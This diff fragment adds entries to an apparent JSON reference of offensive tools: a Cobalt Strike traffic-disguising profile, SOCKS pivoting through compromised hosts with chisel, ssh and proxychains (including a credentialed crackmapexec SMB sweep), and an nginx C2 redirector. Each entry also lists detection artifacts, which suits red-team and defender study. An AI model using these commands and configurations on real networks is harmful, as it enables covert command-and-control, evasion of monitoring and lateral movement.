+        "description": "Cobalt Strike's profile language for customizing Beacon network traffic to blend with legitimate web applications. Defines HTTP headers, URI patterns, cookie formats, POST data structures, and SSL certificate metadata. Profiles make Beacon traffic indistinguishable from legitimate application traffic matching the profile's target site.",
+        "common_syntax": "set sleeptime \"30000\"; set jitter \"35\"; http-get { set uri \"/pixel.gif\"; client { header \"Accept\" \"image/gif\"; metadata { base64url; prepend \"__cfduid=\"; header \"Cookie\"; } } server { header \"Content-Type\" \"image/gif\"; output { print; } } } http-post { set uri \"/submit.php\"; client { header \"Content-Type\" \"application/x-www-form-urlencoded\"; id { parameter \"id\"; } output { print; } } }",
+        "output_parsing": "Profile validation shows any syntax errors. Test with 'c2lint <profile.profile>'. Successful profile load shows ' beacon is using <profile> profile'. Capture traffic with Wireshark to verify header/URI patterns match profile. Jitter range shows as 'jitter X%'. Sleeptime in milliseconds.",
+        "artifacts": "Network traffic matching target site patterns (headers, cookies, URIs) but with anomalous timing/frequency, SSL certificate metadata matching profile but not matching legitimate service, hidden data in Cookie/Authorization headers, base64url-encoded metadata strings, HTTP 302 redirects matching profile directives"
+      },
+      {
+        "name": "SOCKS Proxies",
+        "category": "Proxy/Tunneling",
+        "description": "SOCKS4/SOCKS5 proxy configurations that route traffic through compromised hosts for pivoting and C2. Created by C2 frameworks (Cobalt Strike, Sliver, Metasploit) or standalone tools (chisel, ssh -D). Enable lateral movement through network boundaries by tunneling arbitrary TCP connections through the proxy host.",
+        "common_syntax": "beacon> socks 1080; chisel client 10.0.0.5:8080 R:socks; ssh -D 1080 -C -q admin@10.0.0.5; proxychains4 nmap -sT -Pn 10.0.0.10; proxychains4 crackmapexec smb 10.0.0.0/24 -u admin -p pass",
+        "output_parsing": "Cobalt Strike shows 'SOCKS proxy started on port 1080'. chisel shows tunnel establishment confirmation. SSH socks proxy runs silently. Verify with 'curl --socks5 127.0.0.1:1080 http://target'. Use proxychains.conf to configure: 'socks5 127.0.0.1 1080'. Connection failures show 'SOCKS server failure'.",
+        "artifacts": "Listening port on compromised host (netstat shows SOCKS listener), proxy configuration files (proxychains.conf), connection timeouts from chained proxies, traffic volume anomalies (single host relaying for many sources), SOCKS handshake packets in network captures"
+      },
+      {
+        "name": "Nginx Reverse Proxy",
+        "category": "C2 Infrastructure",
+        "description": "Nginx configured as a reverse proxy to relay C2 traffic, adding TLS termination, domain fronting capability, and legitimate web traffic blending. Used to create C2 redirectors that hide the true team server IP. Supports stream proxying for raw TCP, HTTP/HTTPS proxying, and WebSocket relay for persistent connections.",
+        "common_syntax": "server { listen 443 ssl; server_name www.legit-corp.com; ssl_certificate /etc/nginx/cert.pem; ssl_certificate_key /etc/nginx/key.pem; location /api/ { proxy_pass http://10.0.0.5:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; } location / { root /var/www/html; index index.html; } }",
+        "output_parsing": "Nginx access logs show client IP -> proxied target. Upstream errors: '502 Bad Gateway' means team server unreachable. '429 Too Many Requests' from rate limiting. Verify proxy with 'curl -k https://redirector.domain/api/'. Use 'nginx -t' to validate configuration before reload.",
+        "artifacts": "Nginx access logs with unusual URI patterns behind legitimate domains, proxy_pass directives pointing to internal IP addresses, TLS certificates for redirector domains, X-Forwarded-For headers revealing true client IP, high bandwidth through /api/ or similar paths compared to static content paths"
+      }
+    ]
+  }
+}
